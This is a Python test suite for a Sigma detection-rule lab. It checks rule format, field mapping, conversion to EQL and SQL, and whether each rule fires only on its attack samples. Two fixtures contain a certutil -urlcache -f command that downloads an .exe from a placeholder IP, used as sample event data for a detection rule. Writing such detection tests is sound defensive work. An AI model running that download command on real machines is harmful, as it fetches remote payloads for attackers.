"""Every Sigma rule is well formed, converts for both engines and behaves on the samples."""

import re
import uuid

import pytest
import yaml

from detlab import samples
from detlab.convert import to_eql, to_sql
from detlab.engine import SqliteEngine, flatten, match_matrix
from detlab.fields import FIELD_MAP, LOGSOURCES, flat
from detlab.rules import SIGMA_DIR, load_rules

RULE_FILES = sorted(SIGMA_DIR.rglob("*.yml"))
REQUIRED = ["title", "id", "status", "description", "references", "author", "date", "tags", "logsource",
            "detection", "falsepositives", "level"]
PREFIX = {"windows": "win_", "linux": "lnx_"}


def _load(path):
    return yaml.safe_load(path.read_text(encoding="utf-8"))


def test_the_lab_has_rules():
    assert len(RULE_FILES) >= 30


@pytest.mark.parametrize("path", RULE_FILES, ids=lambda path: path.stem)
def test_rule_file_is_well_formed(path):
    rule = _load(path)
    missing = [key for key in REQUIRED if not rule.get(key)]
    assert not missing, f"missing: {missing}"
    assert list(rule)[:len(REQUIRED)] == REQUIRED, "keys are not in the usual Sigma order"
    assert uuid.UUID(rule["id"]).version == 4
    assert rule["status"] in {"test", "stable", "experimental"}
    assert rule["level"] in {"low", "medium", "high", "critical"}
    assert re.fullmatch(r"\d{4}-\d{2}-\d{2}", str(rule["date"]))
    assert rule["description"].startswith("Detects ")
    assert "condition" in rule["detection"]
    product = rule["logsource"]["product"]
    assert path.parent.name == product, "the rule is in the wrong folder"
    assert path.stem.startswith(PREFIX[product]), f"file name must start with {PREFIX[product]}"
    assert (product, rule["logsource"]["category"]) in LOGSOURCES, "the lab has no events for this log source"
    assert all(str(reference).startswith("https://") for reference in rule["references"])


def test_ids_and_titles_are_unique():
    loaded = [_load(path) for path in RULE_FILES]
    assert len({rule["id"] for rule in loaded}) == len(loaded)
    assert len({rule["title"] for rule in loaded}) == len(loaded)


def _fields(detection):
    """Field names used in a detection section, without modifiers."""
    found = set()
    for name, body in detection.items():
        if name == "condition":
            continue
        for item in body if isinstance(body, list) else [body]:
            found |= {key.split("|")[0] for key in item}
    return found


@pytest.mark.parametrize("path", RULE_FILES, ids=lambda path: path.stem)
def test_every_field_has_a_mapping(path):
    unmapped = _fields(_load(path)["detection"]) - set(FIELD_MAP)
    assert not unmapped, f"add {sorted(unmapped)} to detlab/fields.py"


def test_every_rule_converts_for_both_engines(rules):
    for rule in rules:
        eql = to_eql(rule)
        assert eql.startswith("any where "), rule.key
        assert to_sql(rule).startswith("SELECT * FROM logs WHERE "), rule.key
        # The converted query must use ECS names only: no Sigma field may survive the mapping.
        leftovers = [field for field in FIELD_MAP if re.search(rf"(?<![\w.]){field}(?![\w.])\s*(:|like|==|!=)", eql)]
        assert not leftovers, f"{rule.key}: unmapped {leftovers}"


def test_conversion_does_not_change_the_rule(rules):
    rule = rules[0]
    assert to_eql(rule) == to_eql(rule)
    assert to_sql(rule) == to_sql(rule)


def test_every_rule_has_attack_and_benign_samples(rules, events):
    attack_events, benign_events = events
    keys = {rule.key for rule in rules}
    assert keys == {event["labels"]["lab_rule"] for event in attack_events}
    assert keys == {event["labels"]["lab_rule"] for event in benign_events} - {"background"}


def test_sample_ids_are_unique(events):
    ids = [event["event"]["id"] for group in events for event in group]
    assert len(ids) == len(set(ids))


def test_rules_fire_on_their_attack_samples_and_on_nothing_else(rules, events):
    everything = events[0] + events[1]
    problems = samples.differences(samples.expected(everything), match_matrix(rules, everything))
    assert not problems, "\n".join(problems)


def test_a_broken_rule_is_noticed(rules, events):
    """The comparison must report a rule that stops firing and one that fires too often."""
    everything = events[0] + events[1]
    actual = match_matrix(rules, everything)
    wanted = samples.expected(everything)
    victim = events[0][0]["event"]["id"]
    bystander = events[1][0]["event"]["id"]
    actual[victim] = []
    actual[bystander] = ["win_certutil_download"]
    problems = samples.differences(wanted, actual)
    assert f"missed: {wanted[victim][0]} did not fire on {victim}" in problems
    assert f"false positive: win_certutil_download fired on {bystander}" in problems
    assert len(problems) == 2


def test_matching_ignores_case_like_sigma(rules):
    rule = next(rule for rule in rules if rule.key == "win_certutil_download")
    event = {"event": {"id": "shouting", "code": "1", "provider": "microsoft-windows-sysmon"},
             "process": {"executable": "C:\\WINDOWS\\SYSTEM32\\CERTUTIL.EXE", "pe": {"original_file_name": "x"},
                         "command_line": "CERTUTIL.EXE -URLCACHE -F HTTP://203.0.113.10/A.EXE A.EXE"}}
    assert SqliteEngine([event]).matches(rule) == ["shouting"]


def test_an_event_from_another_log_source_does_not_match(rules):
    rule = next(rule for rule in rules if rule.key == "win_certutil_download")
    event = {"event": {"id": "linux-one"}, "host": {"os": {"type": "linux"}},
             "process": {"executable": "/usr/bin/certutil.exe", "pe": {"original_file_name": "CertUtil.exe"},
                         "command_line": "certutil.exe -urlcache -f http://203.0.113.10/a.exe"}}
    assert SqliteEngine([event]).matches(rule) == []


def test_flatten_and_column_names():
    assert flatten({"process": {"parent": {"name": "cmd.exe"}}, "event": {"code": "1"}}) == {
        "process.parent.name": "cmd.exe", "event.code": "1"}
    assert flat("process.parent.name") == "process_parent_name"
    assert flat("@timestamp") == "timestamp"


def test_rule_files_load_one_rule_each():
    assert len(load_rules()) == len(RULE_FILES)
